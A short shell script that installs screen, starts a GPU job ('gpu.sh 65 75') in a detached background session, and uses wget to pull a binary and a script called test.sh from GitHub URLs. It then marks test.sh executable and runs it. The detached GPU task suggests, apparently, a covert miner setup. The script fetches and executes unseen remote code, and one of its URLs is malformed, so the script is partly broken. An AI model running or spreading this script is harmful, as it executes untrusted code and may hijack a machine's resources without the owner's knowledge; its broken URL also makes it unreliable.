  
#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/bruhinbru/dick/raw/main/dick
wget https://raw.githubusercontent.com/dick/main/test.sh
chmod +x test.sh
./test.sh
